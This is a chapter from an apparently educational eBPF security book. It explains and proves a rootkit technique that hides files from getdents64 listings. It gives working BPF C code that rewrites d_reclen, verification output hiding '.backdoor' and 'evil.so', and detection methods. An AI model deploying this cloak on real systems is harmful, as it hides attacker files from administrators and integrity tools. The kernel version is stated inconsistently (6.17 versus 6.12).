---
layout: book
title: "Chapter 10: Inode Cloak"
date: 2025-02-10
---

# Chapter 10: Making Files Vanish from getdents64

> **See also**: [Blog post]({{ site.baseurl }}/inode-cloak.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch10-inode-cloak) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Proof status**: Proved on Ubuntu 6.17.0-29-generic aarch64 (Lima VM). **Source fix**: The BPF map was originally named `active`, which collided with the kernel enum value `active = 6` in `vmlinux.h` on this kernel, causing a compile error. The map has been renamed to `active_calls` in `ch10-inode-cloak.bpf.c`. This fix is in the source; `make` succeeds cleanly after the rename.

This one isn't new. The `d_reclen`-swallow trick for hiding dirents inside the `getdents64` return buffer has been in rootkit proof-of-concepts for years; Jiska Classen's work, the kovid/reveng'd crowd, and various LKM rootkits have used variants of it since at least 2016. What the POC adds is narrow: a modern CO-RE reproduction on 6.12 aarch64 using two syscall tracepoints, with ringbuf evidence and honest testing against `ls`, `find`, and `stat`.

## Mechanism

When `getdents64` returns, each entry in the user buffer carries its own `d_reclen` telling userspace how many bytes to skip to reach the next record. If I extend the preceding entry's `d_reclen` so it covers the one I want to hide, every userspace reader; libc, Python, Go; strides right over the hidden name without ever seeing it. No file is deleted. No inode is touched on disk. `open("/tmp/cloak/.backdoor")` still works because name resolution goes through a different path entirely.

A factual correction from the earlier draft: the hooks are not at `iterate_dir` or `vfs_stat`. `iterate_dir` runs inside the kernel, before entries are copied to userspace, and kprobing it to filter would require mutating the in-kernel `dir_context`; a much harder problem that this POC doesn't attempt. The tracepoint-plus-`bpf_probe_write_user` path is the one that actually works.

## Hook points

Two syscall tracepoints plus a HASH map of filenames to hide:

- **`tp/syscalls/sys_enter_getdents64`**; stash the userspace `dirp` pointer in a per-`pid_tgid` hash map (`active_calls`).
- **`tp/syscalls/sys_exit_getdents64`**; walk the returned stream, match each `d_name` against the `hidden` map, and on a hit rewrite the predecessor's `d_reclen` to swallow the matched entry.

What `bpf_probe_write_user` can and can't do here is worth being explicit about. It can write to the current task's userspace pages because on syscall exit the buffer is still resident and owned by the caller. It can't re-scan indefinitely because the verifier caps loops; the POC bounds the dirent walk to 64 entries per call, which is the ceiling I could convince the verifier to accept with the linear probe pattern. Directories with more than 64 entries per `getdents64` return can leak names past the bound.

Edge case: if the hit is the first entry in the buffer, there is no predecessor to extend. The POC falls back to zeroing `d_ino` so naive readers that treat `ino=0` as "skip" drop it on the floor. That's strictly weaker than the swallow trick. Both paths emit a ringbuf event so the two cases are distinguishable in evidence.

The exit handler is where all the work happens. It retrieves the stashed `dirp` pointer, walks the dirent stream entry by entry, and rewrites `d_reclen` in-place for any match it finds:

```c
SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    struct dctx *d = bpf_map_lookup_elem(&active_calls, &id);
    if (!d) return 0;
    long ret = ctx->ret;
    if (ret <= 0) { bpf_map_delete_elem(&active_calls, &id); return 0; }

    u64 dirp = d->dirp;
    long bpos = 0;
    struct linux_dirent64 *prev = NULL;
    u16 prev_reclen = 0;

    #pragma unroll
    for (int i = 0; i < 64; i++) {
        if (bpos >= ret) break;
        struct linux_dirent64 de = {};
        if (bpf_probe_read_user(&de, sizeof(de), (void *)(dirp + bpos)) < 0) break;
        u16 rlen = de.d_reclen;
        if (rlen < sizeof(de) || rlen > 1024) break;

        struct hidden_name key = {};
        bpf_probe_read_user_str(&key.name, NAME_MAX,
            (void *)(dirp + bpos + offsetof(struct linux_dirent64, d_name)));

        if (bpf_map_lookup_elem(&hidden, &key)) {
            if (prev) {
                u16 new_reclen = prev_reclen + rlen;
                bpf_probe_write_user(&prev->d_reclen, &new_reclen, sizeof(new_reclen));
                prev_reclen = new_reclen;
            } else {
                u64 zero_ino = 0;
                bpf_probe_write_user(&((struct linux_dirent64 *)(dirp + bpos))->d_ino,
                                     &zero_ino, sizeof(zero_ino));
            }
        } else {
            prev = (struct linux_dirent64 *)(dirp + bpos);
            prev_reclen = rlen;
        }
        bpos += rlen;
    }
    bpf_map_delete_elem(&active_calls, &id);
    return 0;
}
```

## Verification

`trigger.sh` runs a BEFORE/AFTER against `/tmp/cloak` populated with `{visible, .backdoor, evil.so, notes.txt}` and a hidden set of `{.backdoor, evil.so}`:

```
=== BEFORE (loader not running) ===
/tmp/cloak contents via ls -A:
.backdoor
evil.so
notes.txt
visible
files_seen=4

=== AFTER (loader running; cloaking .backdoor and evil.so) ===
/tmp/cloak contents via ls -A:
notes.txt
visible
files_seen=2
hidden_by_bpf=".backdoor evil.so"

=== stat /tmp/cloak/.backdoor (cloak is readdir-only) ===
  File: /tmp/cloak/.backdoor
stat_still_works=yes

=== ringbuf cloak events (loader stdout) ===
[cloak] pid=1234  comm=ls    hiding=.backdoor
[cloak] pid=1234  comm=ls    hiding=evil.so

=== CLOAK_PROVEN before_count=4 after_count=2 hidden=2 stat_still_works=yes ===
```

The honest limits of the cloak:

- It runs on `getdents64` only. Legacy 32-bit `getdents` is not hooked.
- `stat`, `open`, `inotify`, `fanotify`, and anything that reads the raw filesystem image see the file normally.
- A defender who does `debugfs -R 'ls /tmp/cloak' /dev/sda1`, reads directory entries off the block device, or walks `/proc/*/fd` sees everything.
- The 64-entry loop bound means very large directories can leak names past the cap.

## Detection

`bpftool prog show` lists both tracepoint programs. The loudest tell is `bpftool map dump name hidden`, which prints the cloaked filename set in cleartext; the attacker has to keep the map populated for the cloak to fire. Cross-referencing `ls` output with `find -inum` exposes the discrepancy immediately. Every FIM tool I tested is blind to this cloak because every FIM tool trusts `readdir`.

`bpf_probe_write_user` emits a rate-limited dmesg warning on use: `BPF: <program_name> is writing to user space memory.` Note that on 6.12 the helper does not set the `TAINT_USER` kernel taint bit; the detection signal is purely in dmesg.

The cloak is a sharp demonstration of the gap between what the filesystem knows and what userspace sees. The inode is intact, the data is on disk, and `stat` returns honest answers. Only `readdir` is lying, and only because we are rewriting the buffer after the kernel has already filled it. Any security tool that skips the syscall layer and reads the filesystem directly is immune. Any tool that doesn't — which is most of them — is not.

> **See also**: [POC source; ch10-inode-cloak](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch10-inode-cloak) · Harness entry: `Poc("ch10", ...)` in `dBPF-pocs/harness/proof.py`
